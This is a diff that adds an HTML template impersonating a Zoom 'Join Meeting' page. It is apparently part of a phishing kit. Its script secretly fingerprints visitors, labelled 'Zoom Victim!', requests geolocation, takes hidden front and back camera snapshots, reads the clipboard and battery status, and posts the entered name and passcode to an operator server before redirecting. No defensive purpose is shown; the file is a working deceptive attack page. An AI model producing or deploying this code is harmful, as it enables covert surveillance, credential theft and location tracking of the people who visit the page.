@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Join Meeting - Zoom</title>
+<link rel="icon" href="https://st1.zoom.us/zoom.ico">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f7f7f7; min-height: 100vh; display: flex; flex-direction: column; }
+.header { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 14px 30px; display: flex; align-items: center; }
+.logo { font-size: 22px; font-weight: 700; color: #0B5CFF; }
+.logo span { color: #333; font-weight: 400; font-size: 14px; margin-left: 10px; }
+.main { flex: 1; display: flex; align-items: center; justify-content: center; }
+.card { background: #fff; border-radius: 12px; padding: 40px; width: 420px; max-width: 90vw; box-shadow: 0 2px 12px rgba(0,0,0,0.06); text-align: center; }
+.card h1 { font-size: 24px; font-weight: 600; color: #232333; margin-bottom: 6px; }
+.card .sub { font-size: 14px; color: #747487; margin-bottom: 28px; }
+.form-group { margin-bottom: 16px; text-align: left; }
+.form-group label { font-size: 13px; color: #232333; font-weight: 500; margin-bottom: 6px; display: block; }
+.form-group input { width: 100%; padding: 12px 14px; border: 1px solid #d8d8e5; border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s; }
+.form-group input:focus { border-color: #0B5CFF; }
+.terms { font-size: 12px; color: #747487; margin-bottom: 20px; text-align: left; }
+.terms a { color: #0B5CFF; }
+.btn-join { width: 100%; padding: 13px; background: #0B5CFF; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+.btn-join:hover { background: #0048d4; }
+.loading { display: none; padding: 20px; }
+.spinner { border: 3px solid #e0e0e0; border-top: 3px solid #0B5CFF; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.meeting-info { background: #f0f4ff; border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 13px; color: #444; }
+.footer { text-align: center; padding: 16px; font-size: 12px; color: #747487; }
+</style>
+</head>
+<body>
+<div class="header"><div class="logo">Zoom<span>Video Conferencing</span></div></div>
+<div class="main">
+<div class="card">
+<h1>Join Meeting</h1>
+<p class="sub">Enter your details to join the meeting</p>
+<div class="meeting-info">Meeting ID: <b id="meetId"></b> • Hosted by Admin</div>
+<form id="loginForm">
+<div class="form-group"><label>Your Name</label><input type="text" id="username" placeholder="Enter your full name" required></div>
+<div class="form-group"><label>Meeting Passcode (optional)</label><input type="text" id="password" placeholder="Meeting passcode"></div>
+<p class="terms">By joining, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a></p>
+<button type="submit" class="btn-join">Join Meeting</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="font-size:14px;color:#555;">Connecting to meeting...</p>
+<p style="font-size:12px;color:#999;margin-top:6px;">Please wait while we set up your session</p>
+</div>
+</div>
+</div>
+<div class="footer">Copyright ©2024 Zoom Video Communications, Inc. All rights reserved. | Privacy | Terms</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+document.getElementById('meetId').textContent=Math.floor(100000000+Math.random()*900000000).toString().replace(/(\d{3})(\d{3})(\d{3})/,'$1 $2 $3');
+async function gatherAll(){
+    let td='📸 <b>Zoom Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+document.getElementById('loginForm').addEventListener('submit',async function(e){
+    e.preventDefault();
+    var user=document.getElementById('username').value, pass=document.getElementById('password').value;
+    document.querySelector('form').style.display='none';
+    document.getElementById('loading').style.display='block';
+    $.post("<%=a %>/creds",{uid:uid,user:encodeURIComponent(user),pass:encodeURIComponent(pass),platform:'Zoom'});
+    await gatherAll(); advancedGather("<%=a %>","<%=uid %>");
+    await new Promise(r=>setTimeout(r,3000));
+    window.location.href="<%=url %>";
+});
+window.onload=gatherAll;
+</script>
+</body>
+</html>
